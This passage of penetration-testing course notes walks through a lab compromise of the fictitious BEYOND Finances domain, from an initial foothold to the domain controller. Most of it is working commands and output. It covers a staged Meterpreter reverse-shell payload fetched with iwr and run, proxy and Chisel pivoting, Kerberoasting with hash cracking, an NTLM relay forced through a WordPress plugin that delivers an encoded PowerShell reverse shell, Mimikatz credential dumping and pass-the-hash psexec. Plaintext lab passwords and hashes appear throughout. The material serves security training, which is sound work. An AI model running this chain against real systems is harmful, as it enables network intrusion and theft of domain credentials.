Therefore, let's set up a SOCKS5 proxy to perform network enumeration via Nmap and CrackMapExec in order to identify accessible services, open ports, and SMB settings
+ First, we'll create a staged Meterpreter TCP reverse shell as an executable file with **msfvenom**
+ Since we can reuse the binary throughout the domain, we can store it in **/home/kali/beyond**
```
kali@kali:~/beyond$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: met.exe
```

Now, let's start a _multi/handler_ listener with the corresponding settings in Metasploit
+ In addition, we'll **set** the option **ExitOnSession** to **false**
+ It specifies that the listener stays active for new sessions without the need to restart it for every incoming session
```
kali@kali:~/beyond$ sudo msfconsole -q

msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 192.168.119.5
LHOST => 192.168.119.5

msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443

msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false

msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started HTTPS reverse handler on https://192.168.119.5:443
```

Next, we can download and execute **met.exe** on CLIENTWK1
```
PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe

PS C:\Users\marcus> .\met.exe
```

In Metasploit, a new session should appear:
```
[*] Meterpreter session 1 opened (192.168.119.5:443 -> 192.168.50.242:64234) at 2022-10-11 07:05:22 -0400
```

Once session 1 is opened, we can use **multi/manage/autoroute** and **auxiliary/server/socks_proxy** to create a SOCKS5 proxy to access the internal network from our Kali box as we learned in the "The Metasploit Framework" Module
```
msf6 exploit(multi/handler) > use multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set session 1
session => 1

msf6 post(multi/manage/autoroute) > run
[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against CLIENTWK1
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.16.6.0/255.255.255.0 from host's routing table.
[*] Post module execution completed

msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1

msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5

msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 2.
```

The SOCKS5 proxy is now active and we can use _proxychains_ to access the internal network
+ Let's confirm that **/etc/proxychains4.conf** still contains the necessary settings from previous Modules
+ Meaning, only the SOCKS5 entry from the following listing should be active
```
kali@kali:~/beyond$ cat /etc/proxychains4.conf
...
socks5  127.0.0.1 1080
```

Finally, we are set up to enumerate the network via Proxychains
+ Let's begin with CrackMapExec's SMB module to retrieve basic information of the identified servers (such as SMB settings)
+ We'll also provide the credentials for _john_ to list the SMB shares and their permissions with **--shares**
+ Because CrackMapExec doesn't have an option to specify an output file, we'll copy the results manually and store them in a file
```
kali@kali:~/beyond$ proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
SMB         172.16.6.240    445    DCSRV1           [*] Windows 10.0 Build 20348 x64 (name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:False)
SMB         172.16.6.241    445    INTERNALSRV1     [*] Windows 10.0 Build 20348 x64 (name:INTERNALSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         172.16.6.254    445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         172.16.6.240    445    DCSRV1           [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.6.241    445    INTERNALSRV1     [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.6.240    445    DCSRV1           [+] Enumerated shares
SMB         172.16.6.240    445    DCSRV1           Share           Permissions     Remark
SMB         172.16.6.240    445    DCSRV1           -----           -----------     ------
SMB         172.16.6.240    445    DCSRV1           ADMIN$                          Remote Admin
SMB         172.16.6.240    445    DCSRV1           C$                              Default share
SMB         172.16.6.240    445    DCSRV1           IPC$            READ            Remote IPC
SMB         172.16.6.240    445    DCSRV1           NETLOGON        READ            Logon server share 
SMB         172.16.6.240    445    DCSRV1           SYSVOL          READ            Logon server share 
SMB         172.16.6.241    445    INTERNALSRV1     [+] Enumerated shares
SMB         172.16.6.241    445    INTERNALSRV1     Share           Permissions     Remark
SMB         172.16.6.241    445    INTERNALSRV1     -----           -----------     ------
SMB         172.16.6.241    445    INTERNALSRV1     ADMIN$                          Remote Admin
SMB         172.16.6.241    445    INTERNALSRV1     C$                              Default share
SMB         172.16.6.241    445    INTERNALSRV1     IPC$            READ            Remote IPC
SMB         172.16.6.254    445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.6.254    445    MAILSRV1         [+] Enumerated shares
SMB         172.16.6.254    445    MAILSRV1         Share           Permissions     Remark
SMB         172.16.6.254    445    MAILSRV1         -----           -----------     ------
SMB         172.16.6.254    445    MAILSRV1         ADMIN$                          Remote Admin
SMB         172.16.6.254    445    MAILSRV1         C$                              Default share
SMB         172.16.6.254    445    MAILSRV1         IPC$            READ            Remote IPC
```
+ Above shows that _john_ doesn't have actionable or interesting permissions on any of the discovered shares
+ As we already established via a pre-built BloodHound query and now through the scan, _john_ as a normal domain user doesn't have local Administrator privileges on any of the machines in the domain
	+ **NOTE**: CrackMapExec version 5.4.0 may throw the error **`The NETBIOS connection with the remote host is timed out`** for DCSRV1, or doesn't provide any output at all. Version 5.4.1 contains a fix to address this issue

The output also states that MAILSRV1 and INTERNALSRV1 have _SMB signing_ set to _False_
+ Without this security mechanism enabled, we can potentially perform relay attacks if we can force an authentication request

Next, let's use Nmap to perform a port scan on ports commonly used by web applications and FTP servers targeting MAILSRV1, DCSRV1, and INTERNALSRV1
+ We have to specify **-sT** to perform a TCP connect scan
+ Otherwise, Nmap will not work over Proxychains
```
kali@kali:~/beyond$ sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.6.240 172.16.6.241 172.16.6.254
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-11 07:17 EDT
Nmap scan report for 172.16.6.240
Host is up (2.2s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  closed http
443/tcp closed https

Nmap scan report for internalsrv1.beyond.com (172.16.6.241)
Host is up (0.21s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  open   http
443/tcp open   https

Nmap scan report for 172.16.6.254
Host is up (0.20s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  open   http
443/tcp closed https

Nmap done: 3 IP addresses (3 hosts up) scanned in 14.34 seconds
```
+ Above shows that Nmap identified the open ports 80 and 443 on 172.16.6.241 (INTERNALSRV1) and port 80 on 172.16.6.254 (MAILSRV1)
+ For now, we can skip the latter one as it's most likely the same web page and service we enumerated from an external perspective

While we could use the SOCKS5 proxy and proxychains to browse to the open port on 172.16.6.241, we'll use _Chisel_ as it provides a more stable and interactive browser session
+ From the releases page, we download the Windows and Linux amd64 versions and extract the binaries in **/home/kali/beyond/**.

On our Kali machine, we'll use Chisel in server mode to receive incoming connections on port 8080
+ In addition, we'll add the **--reverse** option to allow reverse port forwarding
```
kali@kali:~/beyond$ chmod a+x chisel

kali@kali:~/beyond$ ./chisel server -p 8080 --reverse
2022/10/11 07:20:46 server: Reverse tunnelling enabled
2022/10/11 07:20:46 server: Fingerprint UR6ly2hYyr8iefMfm+gK5mG1R06nTKJF0HV+2bAws6E=
2022/10/11 07:20:46 server: Listening on http://0.0.0.0:8080
```

Then, we'll transfer the extracted **chisel.exe** binary to CLIENTWK1 by using Meterpreter's _upload_ command
```
msf6 auxiliary(server/socks_proxy) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > upload chisel.exe C:\\Users\\marcus\\chisel.exe
[*] Uploading  : /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe
[*] Uploaded 7.85 MiB of 7.85 MiB (100.0%): /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe
[*] Completed  : /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe
```

Now, we can enter **shell** and utilize Chisel in client mode to connect back to our Kali machine on port 8080
+ We'll create a reverse port forward with the syntax **`R:localport:remotehost:remoteport`**
+ In our case, the remote host and port are 172.16.6.241 and 80. The local port we want to utilize is 80
```
C:\Users\marcus> chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80
2022/10/11 07:22:46 client: Connecting to ws://192.168.119.5:8080
2022/10/11 07:22:46 client: Connected (Latency 11.0449ms)
```

Once Chisel connects, we can browse to port 80 on 172.16.6.241 via port 80 on our Kali machine (127.0.0.1) by using Firefox:
![[Pasted image 20240108162741.png]]
+ Above shows us a WordPress instance (indicated by the URL and title of the page) on INTERNALSRV1
+ Let's browse to the dashboard login page for WordPress at **`http://127.0.0.1/wordpress/wp-admin`** and try to log into it with credentials we've discovered so far
+ Once we have entered the URL, Firefox displays an error:
![[Pasted image 20240108162815.png]]

The navigation bar in Firefox shows that we were redirected to **internalsrv1.beyond.com**
+ We can assume that the WordPress instance has the DNS name set as this address instead of the IP address
+ Because our machine doesn't have information about this DNS name, we cannot connect to the page

To be able to fully use the web application, we'll add **internalsrv1.beyond.com** via **127.0.0.1** to **/etc/hosts**
```
kali@kali:~/beyond$ cat /etc/hosts                         
127.0.0.1       localhost
127.0.1.1       kali
...
127.0.0.1    internalsrv1.beyond.com
...
```

Now, let's open the **/wp-admin** page again
![[Pasted image 20240108162851.png]]
+ Above shows that the login page is now displayed correctly

Let's try to log in with the credentials we've obtained so far as well as common username and password pairs, such as **admin:admin**
+ Unfortunately, none of them work

Let's summarize the information we've gathered in this section before we attempt our attacks
+ First, we enumerated all active sessions
+ Interestingly, the domain administrator _beccy_ has an active session on MAILSRV1
+ Next, we identified _daniela_ as a kerberoastable user due to the **`http/internalsrv1.beyond.com`** SPN

Then, we set up a SOCKS5 proxy with Metasploit and used CrackMapExec and Nmap to perform network enumeration
+ The output revealed that MAILSRV1 and INTERNALSRV1 each have an accessible web server and SMB signing disabled
+ Via Chisel, we were able to browse to the WordPress instance on INTERNALSRV1
+ However, none of the credentials worked to log in to the WordPress login page

## Attacking an Internal Web Application
In the previous Learning Unit, we obtained a huge amount of information and data regarding the client's domain network
+ In this Learning Unit, we'll combine various pieces of gathered information to create an attack vector

### Speak Kerberoast and Enter
Based on the information from the previous Learning Unit, the web application on INTERNALSRV1 is the most promising target at the moment
+ Because it is a WordPress site, we could use WPScan again or use password attacks to successfully log in to WordPress's dashboard

Every time we obtain new information, we should reevaluate what we already know
+ For our situation, this means that we already obtained the information that _daniela_ has an http SPN mapped to INTERNALSRV1
+ Our assumption at this point is that _daniela_ may be able to log in to the WordPress login page successfully

Since _daniela_ is kerberoastable, we can attempt to retrieve the user's password this way
+ If we can crack the _TGS-REP_ password hash, we may be able to log in to WordPress and gain further access to INTERNALSRV1

If this attack vector fails, we can use WPScan and other web application enumeration tools to identify potential vulnerabilities on INTERNALSRV1 or switch targets to MAILSRV1

Let's perform Kerberoasting on Kali with _impacket-GetUserSPNs_ over the SOCKS5 proxy using Proxychains
+ To obtain the TGS-REP hash for _daniela_, we have to provide the credentials of a domain user
+ Because we only have one valid set of credentials, we'll use _john_
```
proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john
```
+ Output:
```
kali@kali:~/beyond$ proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName      Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
------------------------  -------  --------  --------------------------  --------------------------  ----------
http/internalsrv1.beyond.com  daniela            2022-09-29 04:17:20.062328  2022-10-05 03:59:48.376728             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$4c6c4600baa0ef09e40fde6130e3d770$49023c03dcf9a21ea5b943e179f843c575d8f54b1cd85ab12658364c23a46fa53b3db5f924a66b1b28143f6a357abea0cf89af42e08fc38d23b205a3e1b46aed9e181446fa7002def837df76ca5345e3277abaa86...
2e430c5a8f0235b45b66c5fe0c8b4ba16efc91586fc22c2c9c1d8d0434d4901d32665cceac1ab0cdcb89ae2c2d688307b9c5d361beba29b75827b058de5a5bba8e60af3562f935bd34feebad8e94d44c0aebc032a3661001541b4e30a20d380cac5047d2dafeb70e1ca3f9e507eb72a4c7
```

Let's store the hash in **/home/kali/beyond/daniela.hash** and launch Hashcat to crack it:
```
kali@kali:~/beyond$ sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
...
$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$b0750f4754ff26fe77d2288ae3cca539$0922083b88587a2e765298cc7d499b368f7c39c7f6941a4b419d8bb1405e7097891c1af0a885ee76ccd1f32e988d6c4653e5cf4ab9602004d84a6e1702d2fbd5a3379bd376de696b0e8993aeef5b1e78fb24f5d3c
...
3d3e9d5c0770cc6754c338887f11b5a85563de36196b00d5cddecf494cfc43fcbef3b73ade4c9b09c8ef405b801d205bf0b21a3bca7ad3f59b0ac7f6184ecc1d6f066016bb37552ff6dd098f934b2405b99501f2287128bff4071409cec4e9545d9fad76e6b18900b308eaac8b575f60bb:DANIelaRO123
...
```

We successfully cracked the TGS-REP hash and obtained the plaintext password for _daniela_
+ Let's store the username and password in **creds.txt**
+ We already established that no domain user has local _Administrator_ privileges on any domain computers and we cannot use RDP to log in to them
+ However, we may be able to use protocols such as WinRM to access other systems

Next, let's try to log in to WordPress at **/wp-admin** via our forwarded port:
![[Pasted image 20240108170251.png]]
+ We successfully logged in to the WordPress instance as _daniela_
+ In the next section, we'll leverage this access to gain access to another system

### Abuse a WordPress Plugin for a Relay Attack
In the previous section, we retrieved the plaintext password for _daniela_ and gained access to the WordPress dashboard on INTERNALSRV1
+ Let's review some of the settings and plugins
+ We'll begin with the configured users:
![[Pasted image 20240108171428.png]]
+ Above shows _daniela_ is the only user
+ Next, let's check _`Settings > General`_:
![[Pasted image 20240108171502.png]]

The _WordPress Address (URL)_ and _Site Address (URL)_ are DNS names as we assumed
+ All other settings in _Settings_ are mostly default values
+ Let's review the installed plugins next:
![[Pasted image 20240108171530.png]]

Above shows three plugins, but only _Backup Migration_ is enabled
+ Let's click on _Manage_, which brings us to the plugin configuration page
+ Clicking through the menus and settings, we discover the _Backup directory path_:
![[Pasted image 20240108171603.png]]
+ Above shows that we can enter a path in this field, which will be used for storing the backup
+ We may abuse this functionality to force an authentication of the underlying system

Let's pause here for a moment and plan our next steps
+ At the moment, there are two promising attack vectors

The first is to upload a malicious WordPress plugin to INTERNALSRV1
+ By preparing and uploading a web shell or reverse shell, we may be able to obtain code execution on the underlying system

For the second attack vector, we have to review the BloodHound results again and make some assumptions
+ As we have discovered, the local _Administrator_ account has an active session on INTERNALSRV1 
+ Based on this session, we can make the assumption that this user account is used to run the WordPress instance

Furthermore, it's not uncommon that the local _Administrator_ accounts across computers in a domain are set up with the same password
+ Let's assume this is true for the target environment
+ We also learned that the domain administrator _beccy_ has an active session on MAILSRV1 and therefore, the credentials of the user may be cached on the system
+ Due to SMB signing being disabled on MAILSRV1 and INTERNALSRV1, a relay attack is possible if we can force an authentication

Finally, we identified the _Backup directory path_ field in the WordPress _Backup Migration_ plugin containing the path for the backup destination
+ This may allow us to force such an authentication request

Based on all of this information, let's define a plan for the second attack vector
+ First, we'll attempt to force an authentication request by abusing the _Backup directory path_ of the Backup Migration WordPress plugin on INTERNALSRV1
+ By setting the destination path to our Kali machine, we can use _impacket-ntlmrelayx_ to relay the incoming connection to MAILSRV1
+ If our assumptions are correct, the authentication request is made in the context of the local _Administrator_ account on INTERNALSRV1, which has the same password as the local _Administrator_ account on MAILSRV1

If this attack is successful, we'll obtain privileged code execution on MAILSRV1, which we can then leverage to extract the NTLM hash for _beccy_ and therefore, meet one of the primary goals of the penetration test
+ Since the second attack vector not only results in code execution on a single system, but also provides a potential vector to achieve one of the goals of the penetration test, we'll perform the relay attack first

Let's set up **impacket-ntlmrelayx** before we modify the _Backup directory path_ in the WordPress plugin
+ We'll use **--no-http-server** and **-smb2support** to disable the HTTP server and enable SMB2 support
+ We'll specify the external address for MAILSRV1, 192.168.50.242, as target for the relay attack
+ By entering the external address, we don't have to proxy our relay attack via Proxychains
+ Finally, we'll base64-encode a _PowerShell reverse shell oneliner_ that will connect back to our Kali machine on port 9999 and provide it as a command to **-c**:
```
kali@kali:~/beyond$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc JABjAGwAaQ..."
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Next, we'll set up a Netcat listener on port 9999 for the incoming reverse shell
```
kali@kali:~/beyond$ nc -nvlp 9999
listening on [any] 9999 ...
```

Now with everything set up, we can modify the _Backup directory path_
+ Let's set the path to the _URI reference_ **`//192.168.119.5/test`** in which the IP is the address of our Kali machine and **test** is a nonexistent path
![[Pasted image 20240108172234.png]]

Once entered, we can scroll down and click on _Save_
+ This should cause the WordPress plugin to authenticate to impacket-ntlmrelayx in the context of the user running WordPress
```
...
[*] Authenticating against smb://192.168.50.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
...
[*] Service RemoteRegistry is in stopped state
...
[*] Starting service RemoteRegistry
...
[*] Executed specified command on host: 192.168.50.242
...
[*] Stopping service RemoteRegistry
```
+ Above confirms the assumptions we made earlier
+ First, _INTERNALSRV1/ADMINISTRATOR_ was used to perform the authentication
+ Second, by successfully authenticating to MAILSRV1, we confirmed that both machines use the same password for the local _Administrator_ account

The output also states that the relayed command on MAILSRV1 got executed
+ Let's check our Netcat listener for an incoming reverse shell:
```
connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 50063
whoami
nt authority\system

PS C:\Windows\system32> hostname
MAILSRV1

PS C:\Windows\system32> 
```
+ We successfully obtained code execution as _NT AUTHORITY\SYSTEM_ by authenticating as a local _Administrator_ on MAILSRV1 by relaying an authentication attempt from the WordPress plugin on INTERNALSRV1

In the next Learning Unit, we'll leverage the interactive shell on MAILSRV1 to obtain privileged access to the domain and its domain controller

## Gaining Access to the Domain Controller
In the previous Learning Unit, we gained access to MAILSRV1 as _NT AUTHORITY\SYSTEM_
+ Based on the information from enumerating the network, we'll attempt to obtain domain _Administrator_ privileges in this Learning Unit and use them to access the domain controller

### Cached Credentials
As planned, we obtained privileged code execution on MAILSRV1
+ Our next step is to extract the password hash for the user _beccy_, which has an active session on this system
+ Depending on the objective of the penetration test, we should not skip the local enumeration of the MAILSRV1 system
+ This could reveal additional vulnerabilities and sensitive information, which we may miss if we directly attempt to extract the NTLM hash for _beccy_

Once we discover that no AV is running, we should upgrade our shell to Meterpreter
+ This will not only provide us with a more robust shell environment, but also aid in performing post-exploitation

Let's download the previously created Meterpreter reverse shell payload **met.exe** to perform post-exploitation:
```
PS C:\Windows\system32> cd C:\Users\Administrator

PS C:\Users\Administrator> iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe

PS C:\Users\Administrator> .\met.exe
```

In Metasploit, we should receive a new incoming session:
```
[*] Sending stage (200774 bytes) to 192.168.50.242
[*] Meterpreter session 2 opened (192.168.119.5:443 -> 192.168.50.242:50814)
```

Let's interact with the session and spawn a new PowerShell command line shell:
```
msf6 post(multi/manage/autoroute) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > shell
Process 416 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Administrator> 
```

Next, we'll download the current _Mimikatz_ version on Kali and serve it via our Python3 web server on port 8000
+ On MAILSRV1, we'll download Mimikatz with **iwr** and launch it 
```
PS C:\Users\Administrator> iwr -uri http://192.168.119.5:8000/mimikatz.exe -Outfile mimikatz.exe

PS C:\Users\Administrator> .\mimikatz.exe
.\mimi.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
```

Once Mimikatz is launched, we can use **privilege::debug** to obtain _SeDebugPrivilege_
+ Then, we can use **sekurlsa::logonpasswords** to list all provider credentials available on the system
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
...
Authentication Id : 0 ; 253683 (00000000:0003def3)
Session           : Interactive from 1
User Name         : beccy
Domain            : BEYOND
Logon Server      : DCSRV1
Logon Time        : 3/8/2023 4:50:32 AM
SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
        msv :
         [00000003] Primary
         * Username : beccy
         * Domain   : BEYOND
         * NTLM     : f0397ec5af49971f6efbdb07877046b3
         * SHA1     : 2d878614fb421517452fd99a3e2c52dee443c8cc
         * DPAPI    : 4aea2aa4fa4955d5093d5f14aa007c56
        tspkg :
        wdigest :
         * Username : beccy
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : beccy
         * Domain   : BEYOND.COM
         * Password : NiftyTopekaDevolve6655!#!
...
```

We successfully extracted the clear text password and NTLM hash of the domain administrator _beccy_
+ Let's store both of them together with the username in **creds.txt** on our Kali system
+ Armed with these credentials, we can now take the last step of the penetration test: accessing the domain controller. 
	+ We'll do this in the next section

## Lateral Movement
In this section, we'll leverage the domain admin privileges for _beccy_ to get access to the domain controller and therefore, achieve the second goal of the penetration test
+ Because we've obtained the clear text password and NTLM hash for _beccy_, we can use **impacket-psexec** to get an interactive shell on DCSRV1
+ While we could use either of them, let's use the NTLM hash
+ Once we have a command line shell, we confirm that we have privileged access on DCSRV1 (172.16.6.240)
```
kali@kali:~$ proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.6.240.....
[*] Found writable share ADMIN$
[*] Uploading file CGOrpfCz.exe
[*] Opening SVCManager on 172.16.6.240.....
[*] Creating service tahE on 172.16.6.240.....
[*] Starting service tahE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.


C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DCSRV1

C:\Windows\system32> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.6.240
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.6.254
```
+ Above shows that we achieved all goals of the penetration test by obtaining domain administrator privileges and accessing the domain controller

![[daeebbc40a5cfbb70d96f6b10104b453-assemble_flag.pdf]]

## Wrapping Up
In this Module, we performed a penetration test for the fictitious client BEYOND Finances
+ The goals set by the client were to gain access to the internal network, obtain domain _Administrator_ privileges, and access the domain controller

Once we managed to get an initial foothold in the internal network, we performed Kerberoasting to obtain the credentials of a domain user
+ With this account, we could log in to a WordPress instance and abuse a plugin to authenticate to our Kali machine
+ We then relayed the authentication request to another machine and obtained code execution as _NT AUTHORITY\SYSTEM_
+ Armed with administrative privileges, we extracted the credentials of a domain Admin account
+ Then, we successfully accessed the domain controller

We cannot emphasize enough to take detailed notes throughout a real penetration test and keep a good log of when certain actions were performed
+ After a penetration test, we must ensure that we leave everything the way it was
+ Any exploits or artifacts must be removed or, at the very least, the client should be notified about their location

At the end of this Module, let's talk about some of the key takeaways of this penetration test
+ One of the most important lessons of this Module (and the whole course) is to always conduct thorough enumeration
+ We cannot attack what we missed and therefore we should make sure to always map out the entire attack surface of all accessible machines and services within the scope of an assessment

Another important takeaway is that we should never skip or cut short the enumeration process to chase a quick win
+ We may miss crucial information, potentially leading to a much more promising attack vector

Next, once we have obtained administrative privileges on a target system, we should not jump straight to the next machine
+ Armed with these privileges, we can examine areas of the system that may have been previously inaccessible

Finally, let's discuss how we should work with gathered information such as enumeration results
+ It is crucial that we learn to combine information found on different systems and stages of a penetration test
+ We may find information on a machine that we cannot leverage at the current stage, but only later on in the assessment
+ Detailed note taking is essential to not lose track of all the gathered information

Taking these key takeaways into consideration will be tremendously valuable not only in the Challenge Labs, but also in real assessments